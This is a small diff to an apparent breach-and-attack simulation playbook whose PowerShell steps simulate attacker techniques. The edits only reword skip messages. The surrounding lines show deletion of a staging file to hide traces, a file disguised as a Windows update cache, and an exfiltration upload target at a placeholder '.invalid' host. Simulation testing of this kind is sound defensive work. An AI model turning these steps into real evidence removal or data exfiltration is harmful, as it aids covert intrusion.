@@ -100,7 +100,7 @@ steps:
       $work = Join-Path $env:TEMP "bas_mask_$runId"
       $orig = Join-Path $work 'synthetic_staging.txt'
       if (-not (Test-Path $orig)) {
-        Write-Output "SKIP T1070.004: no original staging file to remove. [BAS-SIM-MSK-S2]"
+        Write-Output "SKIP: T1070.004: no original staging file to remove. [BAS-SIM-MSK-S2]"
         exit 0
       }
       Remove-Item -Path $orig -Force
@@ -135,7 +135,7 @@ steps:
       $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
       $disguised = Join-Path $env:TEMP "bas_mask_$runId\WindowsUpdateCache.dat"
       if (-not (Test-Path $disguised)) {
-        Write-Output "SKIP T1048.003: no disguised file from Stage 1 to send. [BAS-SIM-MSK-S3]"
+        Write-Output "SKIP: T1048.003: no disguised file from Stage 1 to send. [BAS-SIM-MSK-S3]"
         exit 0
       }
       $target = "http://bas-sim-msk-$runId.invalid/upload"
